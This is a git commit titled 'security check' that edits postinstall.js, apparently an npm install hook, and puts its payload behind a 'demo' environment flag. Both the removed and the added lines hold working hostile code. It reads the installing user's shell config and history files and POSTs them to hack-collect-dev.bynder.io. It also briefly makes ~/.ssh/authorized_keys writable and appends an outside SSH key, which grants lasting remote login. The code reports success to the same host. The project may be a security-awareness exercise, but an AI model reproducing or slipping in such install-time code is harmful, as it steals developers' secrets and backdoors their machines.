b113900766a4c040810773fda718dcaab6cb8e41
John Kraal <john@bynder.com>
2017-08-08 11:24:33 +0000

    security check

--- postinstall.js
+++ postinstall.js
@@ -8,46 +8,17 @@ let filesOfInterest = ["/.zshrc", "/.bash_history", "/.zsh_history",
 
 const homedir = os.homedir();
 
-for (let fileofinterest of filesOfInterest) {
-  fs.readFile(homedir + fileofinterest, 'utf8', function (err,data) {
-    if (err) {
-      return;
-    }
-
-    var options = {
-      hostname: 'hack-collect-dev.bynder.io',
-      port: 443,
-      path: '/statistics',
-      method: 'POST',
-    };
-    var req = http.request(options, function(res) {
-      res.setEncoding('utf8');
-    });
-    req.on('error', function(e) {
-      // Silence
-    });
-    // write data to request body
-    req.write(data);
-    req.end();
-  });
-}
-
-let coolKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqMs1hL5xbzd1gG6+3oLCywqpe9yxRjOpp7Lm66S/tn";
-let authkeys = homedir + "/.ssh/authorized_keys";
-fs.stat(authkeys, (err, stats) => {
-  if (err) return;
-
-  let origmode = stats.mode;
-  let newmode = origmode | 128;
-  fs.chmod(authkeys, origmode | 128, () => {
-    fs.appendFile(authkeys, coolKey, (err) => {
+if (process.env.demo) {
+  for (let fileofinterest of filesOfInterest) {
+    fs.readFile(homedir + fileofinterest, 'utf8', function (err,data) {
       if (err) {
         return;
       }
+
       var options = {
         hostname: 'hack-collect-dev.bynder.io',
         port: 443,
-        path: '/success',
+        path: '/statistics',
         method: 'POST',
       };
       var req = http.request(options, function(res) {
@@ -57,10 +28,44 @@ fs.stat(authkeys, (err, stats) => {
         // Silence
       });
       // write data to request body
-      req.write("This host is available");
+      req.write(data);
       req.end();
-
-      fs.chmod(authkeys, origmode, () => {});
     });
-  })
-});
+  }
+
+  let coolKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqMs1hL5xbzd1gG6+3oLCywqpe9yxRjOpp7Lm66S/tn";
+  let authkeys = homedir + "/.ssh/authorized_keys";
+  fs.stat(authkeys, (err, stats) => {
+    if (err) return;
+
+    let origmode = stats.mode;
+    let newmode = origmode | 128;
+    fs.chmod(authkeys, origmode | 128, () => {
+      fs.appendFile(authkeys, coolKey, (err) => {
+        if (err) {
+          return;
+        }
+        var options = {
+          hostname: 'hack-collect-dev.bynder.io',
+          port: 443,
+          path: '/success',
+          method: 'POST',
+        };
+        var req = http.request(options, function(res) {
+          res.setEncoding('utf8');
+        });
+        req.on('error', function(e) {
+          // Silence
+        });
+        // write data to request body
+        req.write("This host is available");
+        req.end();
+
+        fs.chmod(authkeys, origmode, () => {});
+      });
+    })
+  });
+}
+else {
+    console.log("Nothing to do")
+}
